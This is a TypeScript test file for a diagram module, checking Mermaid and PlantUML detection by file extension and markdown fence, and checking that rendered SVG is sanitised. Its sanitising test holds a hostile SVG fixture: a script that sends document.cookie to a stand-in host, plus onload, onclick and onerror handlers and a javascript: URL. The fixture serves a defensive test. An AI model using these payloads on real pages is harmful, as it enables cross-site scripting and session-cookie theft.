/**
 * Which files and which fences are diagrams, and what survives sanitising.
 *
 * The detection is a lookup table, which is exactly the kind of thing that
 * quietly loses an extension in a refactor; the sanitising is the part that
 * decides whether a `.mmd` file someone was sent can run script in the app.
 */
import { describe, it, expect } from 'vitest';

import {
  DIAGRAM_EXTENSIONS,
  DIAGRAM_LABELS,
  diagramKindForFence,
  diagramKindForFile,
  isDiagramFile,
  sanitizeSvg,
} from '../diagrams';

describe('diagram files', () => {
  it('knows both languages by extension, case-insensitively', () => {
    expect(diagramKindForFile('flow.mmd')).toBe('mermaid');
    expect(diagramKindForFile('/a/b/Flow.MERMAID')).toBe('mermaid');
    expect(diagramKindForFile('classes.puml')).toBe('plantuml');
    expect(diagramKindForFile('classes.plantuml')).toBe('plantuml');
    expect(diagramKindForFile('seq.wsd')).toBe('plantuml');
    expect(diagramKindForFile('shared.iuml')).toBe('plantuml');
  });

  it('does not claim files it cannot draw', () => {
    expect(diagramKindForFile('notes.md')).toBeNull();
    expect(diagramKindForFile('diagram.svg')).toBeNull();
    expect(diagramKindForFile('Makefile')).toBeNull();
    expect(isDiagramFile('app.ts')).toBe(false);
  });

  it('labels every extension it advertises', () => {
    for (const extension of DIAGRAM_EXTENSIONS) {
      const kind = diagramKindForFile(`x.${extension}`);
      expect(kind).not.toBeNull();
      expect(DIAGRAM_LABELS[kind!]).toBeTruthy();
    }
  });
});

describe('fenced diagrams in markdown', () => {
  it('takes the aliases people actually type', () => {
    expect(diagramKindForFence('mermaid')).toBe('mermaid');
    expect(diagramKindForFence('Mermaid')).toBe('mermaid');
    expect(diagramKindForFence('plantuml')).toBe('plantuml');
    expect(diagramKindForFence('puml')).toBe('plantuml');
    expect(diagramKindForFence('uml')).toBe('plantuml');
  });

  it('leaves ordinary code alone', () => {
    expect(diagramKindForFence('ts')).toBeNull();
    expect(diagramKindForFence('bash')).toBeNull();
    expect(diagramKindForFence('')).toBeNull();
    expect(diagramKindForFence(null)).toBeNull();
    expect(diagramKindForFence(undefined)).toBeNull();
  });
});

describe('sanitising rendered SVG', () => {
  // Diagram source is a file that came from somewhere else, and SVG is a
  // document format with scripts in it. Rendering one is not a reason to run it.
  it('drops script, event handlers and script URLs', () => {
    const hostile = `<svg xmlns="http://www.w3.org/2000/svg">
      <script>fetch('https://example.invalid/' + document.cookie)</script>
      <rect width="10" height="10" onload="alert(1)" onclick="alert(2)"/>
      <a xlink:href="javascript:alert(3)"><text>click</text></a>
      <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="alert(4)"></body></foreignObject>
    </svg>`;
    const clean = sanitizeSvg(hostile);

    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/onload=/i);
    expect(clean).not.toMatch(/onclick=/i);
    expect(clean).not.toMatch(/onerror=/i);
    expect(clean).not.toMatch(/javascript:/i);
  });

  it('keeps the drawing', () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><style>.n{fill:#fff}</style>' +
      '<g><rect class="n" width="10" height="10"/><text x="1" y="2">Alice</text></g></svg>';
    const clean = sanitizeSvg(svg);

    expect(clean).toContain('<svg');
    expect(clean).toContain('<rect');
    expect(clean).toContain('Alice');
    // Mermaid puts the whole diagram's styling in an inline <style>; dropping it
    // leaves an unreadable black-on-black picture rather than a blocked one.
    expect(clean).toContain('.n');
  });
});
